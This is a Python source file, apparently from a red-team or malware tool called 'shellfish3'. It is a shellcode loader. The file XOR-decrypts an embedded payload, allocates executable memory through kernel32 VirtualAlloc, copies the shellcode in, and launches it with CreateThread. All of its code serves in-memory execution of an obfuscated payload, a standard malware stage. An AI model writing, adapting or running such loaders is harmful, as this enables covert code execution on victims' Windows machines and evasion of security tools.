import ctypes
import ctypes.wintypes as wt

from time import sleep
from shellfish3.encrypt import xorDecrypt
from shellfish3.support import get_key, get_example_sc

def start():
    print('[*] Loading requirements...')
    k32 = ctypes.windll.kernel32
    definitions(k32)

    sc = xorDecrypt(get_example_sc(), get_key())
    handler(k32, sc)


def definitions(k32):
    k32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
    k32.VirtualAlloc.restype = wt.LPVOID

    k32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
    k32.CreateThread.restype = wt.HANDLE

    k32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
    k32.RtlMoveMemory.restype = wt.LPVOID

    k32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
    k32.WaitForSingleObject.restype = wt.DWORD

    k32.VirtualProtect.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, ctypes.POINTER(wt.DWORD))
    k32.VirtualProtect.restype = wt.LPVOID


def handler(k32, sc):
    print('[*] Startign SC Handler')

    print('[*] wait.')
    sleep(2)
    addr = make_room(k32, len(sc))

    print('[*] wait..')
    sleep(2)
    move_it(k32, addr, sc)
    #change_perms(k32, addr, len(sc))

    print('[*] wait...')
    sleep(4)
    launcher(k32, addr)


def make_room(k32, sc_len):
    # start page_readwrite (0x04)
    addr = k32.VirtualAlloc(None, sc_len, 0x3000, 0x40)
    return addr


def move_it(k32, addr, sc):
    tmp = k32.RtlMoveMemory(addr, sc, len(sc))


def change_perms(k32, addr, sc_len):
    # Change to page_exec_read
    old_protect = ctypes.c_ulong()
    tmp = k32.VirtualProtect(addr, sc_len, 0x20, ctypes.byref(old_protect))


def launcher(k32, addr):
    try:
        th = k32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_void_p(addr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0))
        )
        print('[+] Success')
        #k32.WaitForSingleObject(th, -1)
    except Exception as e:
        print(f'[-] Fail: {e}')

